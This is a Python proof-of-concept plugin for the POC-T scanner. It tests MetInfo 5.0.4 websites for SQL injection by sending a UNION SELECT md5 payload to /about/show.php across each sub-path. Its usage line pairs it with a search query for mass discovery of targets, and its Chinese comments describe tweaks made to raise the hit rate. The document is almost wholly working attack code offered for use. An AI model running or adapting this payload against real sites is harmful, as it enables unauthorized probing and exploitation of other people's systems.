#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
MetInfo 5.0.4 Sql injection PoC

Usage
  python POC-T.py -s metinfo-504-sqli -aZ "Powered by MetInfo 5.0.4"

"""

import requests
from plugin.util import randomMD5
from plugin.urlparser import iterate_path


def poc(url):
    if '://' not in url:
        if ':443' in url:
            url = 'https://' + url
        else:
            url = 'http://' + url
    plain, cipher = randomMD5()
    # 用全部字段验证，增加70%结果
    payload = "/about/show.php?lang=en&id=-2864 UNION ALL SELECT " + (("md5(%s)," % plain) * 27).rstrip(',') + '--'
    for each in iterate_path(url):  # 对每个子路径尝试，增加20%结果
        target = each.rstrip('/') + payload
        try:
            r = requests.get(target, timeout=20)
            if r.status_code == 200 and cipher in r.content:
                return url
        except Exception:
            pass  # 从break改为pass增加10%结果
    return False
